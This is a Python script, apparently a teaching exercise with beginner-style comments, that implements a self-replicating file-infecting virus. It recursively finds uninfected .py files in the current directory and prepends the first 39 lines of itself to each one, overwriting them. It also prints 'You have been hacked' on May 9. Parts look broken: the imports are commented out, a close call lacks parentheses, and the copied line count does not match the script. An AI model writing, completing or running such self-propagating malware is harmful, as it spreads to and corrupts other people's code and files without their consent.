#!/usr/bin/python3
# import os
# import datetime

# Variable that stores string
# Caps usually are reserved for constants
SIGNATURE = "VIRUS"

# See which files to infect
def locate(path):
    # Create an empty list
    files_targeted = []
    # Store the list of files from the directory
    filelist = os.listdir(path)
    # For all values in the list
    for fname in filelist:
        # Check if the value is a directory
        if os.path.isdir(path+"/"+fname):
            # Using recursion, add the following values into the list
            files_targeted.extend(locate(path+"/"+fname))
        # Check if the value has the filetype shown
        elif fname[-3:] == ".py":
            # Create variable with false value
            infected = False
            # Open the file and go line by line
            for line in open(path+"/"+fname):
                # Check if the line contains the string "VIRUS"
                if SIGNATURE in line:
                    # Change to true
                    infected = True
                    # Exit the for loop
                    break
            # Check if variable is false        
            if infected == False:
                # Add the path as a value to the list
                files_targeted.append(path+"/"+fname)
    # Returns the list
    return files_targeted

# Add extra random data into the files
def infect(files_targeted):
    # Opens the current script file and stores into a variable
    virus = open(os.path.abspath(__file__))
    # Create an empty string
    virusstring = ""
    # Line contains the current line
    # i contains the number of the current line
    # E.g. Line 4, "ASS"
    for i,line in enumerate(virus):
        # 0 is less than or equal to i, AND i is less than 39
        if 0 <= i < 39:
            # Add and assign the the current line to the variable
            virusstring += line
    # Close the file            
    virus.close
    # Go thru the values in the list
    for fname in files_targeted:
        # Open the file
        f = open(fname)
        # Read the contents into the variable
        temp = f.read()
        # Close the file
        f.close()
        # Open file with write priviledges
        f = open(fname,"w")
        # Write the variables into the file
        f.write(virusstring + temp)
        # Close the file
        f.close()
# SHowing off
def detonate():
    # Check if the date is May on day 9
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # LEET HAXORS
        print("You have been hacked")
# ------------- SCRIPT STARTS HERE----------------
# Pass the current directory to locate
# The result of locate will be stored into the variable
# Result: files_targeted, a list variable
files_targeted = locate(os.path.abspath(""))
# Send the list to the function
infect(files_targeted)
# Last function
detonate()
